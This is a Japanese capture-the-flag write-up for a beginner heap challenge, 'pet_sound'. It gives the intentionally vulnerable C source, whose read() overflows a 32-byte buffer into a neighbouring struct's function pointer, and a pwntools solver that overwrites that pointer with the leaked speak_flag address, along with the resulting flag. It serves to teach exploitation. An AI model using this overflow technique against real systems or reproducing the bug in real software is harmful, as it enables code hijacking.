## pet_sound (100pt / 410 solves) [easy]
> ペットに鳴き声を教えましょう。
>
> nc [問題鯖のホスト名] [ポート番号]

次に示すソースコードが与えられている。
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct Pet;
void speak_flag(struct Pet *p);
void speak_sound(struct Pet *p);
void visualize_heap(struct Pet *a, struct Pet *b);

struct Pet {
    void (*speak)(struct Pet *p);
    char sound[32];
};

int main() {
    struct Pet *pet_A, *pet_B;

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    puts("--- Pet Hijacking ---");
    puts("Your mission: Make Pet speak the secret FLAG!\n");
    printf("[hint] The secret action 'speak_flag' is at: %p\n", speak_flag);

    pet_A = malloc(sizeof(struct Pet));
    pet_B = malloc(sizeof(struct Pet));

    pet_A->speak = speak_sound;
    strcpy(pet_A->sound, "wan...");
    pet_B->speak = speak_sound;
    strcpy(pet_B->sound, "wan...");

    printf("[*] Pet A is allocated at: %p\n", pet_A);
    printf("[*] Pet B is allocated at: %p\n", pet_B);
    
    puts("\n[Initial Heap State]");
    visualize_heap(pet_A, pet_B);

    printf("\n");
    printf("Input a new cry for Pet A > ");
    read(0, pet_A->sound, 0x32);

    puts("\n[Heap State After Input]");
    visualize_heap(pet_A, pet_B);

    pet_A->speak(pet_A);
    pet_B->speak(pet_B);

    free(pet_A);
    free(pet_B);
    return 0;
}

void speak_flag(struct Pet *p) {
    char flag[64] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        puts("\nPet seems to want to say something, but can't find 'flag.txt'...");
        return;
    }
    fgets(flag, sizeof(flag), f);
    fclose(f);
    flag[strcspn(flag, "\n")] = '\0';

    puts("\n**********************************************");
    puts("* Pet suddenly starts speaking flag.txt...!? *");
    printf("* Pet: \"%s\" *\n", flag);
    puts("**********************************************");
    exit(0);
}

void speak_sound(struct Pet *p) {
    printf("Pet says: %s\n", p->sound);
}

void visualize_heap(struct Pet *a, struct Pet *b) {
    unsigned long long *ptr = (unsigned long long *)a;
    puts("\n--- Heap Layout Visualization ---");
    for (int i = 0; i < 12; i++, ptr++) {
        printf("0x%016llx: 0x%016llx", (unsigned long long)ptr, *ptr);
        if (ptr == (unsigned long long *)&a->speak) printf(" <-- pet_A->speak");
        if (ptr == (unsigned long long *)a->sound)   printf(" <-- pet_A->sound");
        if (ptr == (unsigned long long *)&b->speak) printf(" <-- pet_B->speak (TARGET!)");
        if (ptr == (unsigned long long *)b->sound)   printf(" <-- pet_B->sound");
        puts("");
    }
    puts("---------------------------------");
}
```

このコードが何をしているのかを知るには実際に実行してみた方が早いだろう。お試しで鯖に`nc`してみる。
```
$ nc [hostname] [port]
--- Pet Hijacking ---
Your mission: Make Pet speak the secret FLAG!

[hint] The secret action 'speak_flag' is at: 0x5716ae05c492
[*] Pet A is allocated at: 0x5716b90f62a0
[*] Pet B is allocated at: 0x5716b90f62d0

[Initial Heap State]

--- Heap Layout Visualization ---
0x00005716b90f62a0: 0x00005716ae05c5d2 <-- pet_A->speak
0x00005716b90f62a8: 0x00002e2e2e6e6177 <-- pet_A->sound
0x00005716b90f62b0: 0x0000000000000000
0x00005716b90f62b8: 0x0000000000000000
0x00005716b90f62c0: 0x0000000000000000
0x00005716b90f62c8: 0x0000000000000031
0x00005716b90f62d0: 0x00005716ae05c5d2 <-- pet_B->speak (TARGET!)
0x00005716b90f62d8: 0x00002e2e2e6e6177 <-- pet_B->sound
0x00005716b90f62e0: 0x0000000000000000
0x00005716b90f62e8: 0x0000000000000000
0x00005716b90f62f0: 0x0000000000000000
0x00005716b90f62f8: 0x0000000000020d11
---------------------------------

Input a new cry for Pet A > A

[Heap State After Input]

--- Heap Layout Visualization ---
0x00005716b90f62a0: 0x00005716ae05c5d2 <-- pet_A->speak
0x00005716b90f62a8: 0x00002e2e2e6e0a41 <-- pet_A->sound
0x00005716b90f62b0: 0x0000000000000000
0x00005716b90f62b8: 0x0000000000000000
0x00005716b90f62c0: 0x0000000000000000
0x00005716b90f62c8: 0x0000000000000031
0x00005716b90f62d0: 0x00005716ae05c5d2 <-- pet_B->speak (TARGET!)
0x00005716b90f62d8: 0x00002e2e2e6e6177 <-- pet_B->sound
0x00005716b90f62e0: 0x0000000000000000
0x00005716b90f62e8: 0x0000000000000000
0x00005716b90f62f0: 0x0000000000000000
0x00005716b90f62f8: 0x0000000000020d11
---------------------------------
Pet says: A
n...
Pet says: wan...
```

プログラムはありがたいことに構造体の様子を教えてくれる。分かりづらいが、`A`と入力した後、`pet_A->sound`の最下位2バイトの値が`0a41`( = `\nA`)に書き換わっている。今回書き換えたいのは`pet_B->speak`で、`pet_A->sound`の先頭から`pet_B->speak`の直前までには40バイトの距離がある。つまり、((8*5=)40バイト分の適当な文字列+`speak_flag`のアドレス)を入力すれば、TARGETである`pet_B->speak`の値がちょうど`speak_flag`のアドレスに書き換わり、Pet Bはフラグを喋るようになるはず。  
以上のことから、値はリトルエンディアンで格納されることに気を付けてソルバを書いた。
```python
from pwn import *

io = remote(hostname, port)

io.recvuntil('[hint] The secret action \'speak_flag\' is at: ')
flag_address = io.recvline()[2:14].decode()

payload = b'A' * 40
payload += pack(int(flag_address, 16), word_size='64', endianness='little')

io.sendlineafter('Input a new cry for Pet A > ', payload)
io.interactive()
```

このソルバを実行するとフラグが得られた。結果を以下に示す。
```
$ python3 solver.py
[+] Opening connection to [hostname] on port [port]: Done
solver.py:5: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil('[hint] The secret action \'speak_flag\' is at: ')
/usr/local/lib/python3.10/dist-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode

[Heap State After Input]

--- Heap Layout Visualization ---
0x0000578593d8e2a0: 0x000057855dc445d2 <-- pet_A->speak
0x0000578593d8e2a8: 0x4141414141414141 <-- pet_A->sound
0x0000578593d8e2b0: 0x4141414141414141
0x0000578593d8e2b8: 0x4141414141414141
0x0000578593d8e2c0: 0x4141414141414141
0x0000578593d8e2c8: 0x4141414141414141
0x0000578593d8e2d0: 0x000057855dc44492 <-- pet_B->speak (TARGET!)
0x0000578593d8e2d8: 0x00002e2e2e6e610a <-- pet_B->sound
0x0000578593d8e2e0: 0x0000000000000000
0x0000578593d8e2e8: 0x0000000000000000
0x0000578593d8e2f0: 0x0000000000000000
0x0000578593d8e2f8: 0x0000000000020d11
---------------------------------
Pet says: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x92D\xc4]\x85W

**********************************************
* Pet suddenly starts speaking flag.txt...!? *
* Pet: "ctf4b{y0u_expl0it_0v3rfl0w!}" *
**********************************************
[*] Got EOF while reading in interactive
$ 
```

### `ctf4b{y0u_expl0it_0v3rfl0w!}`
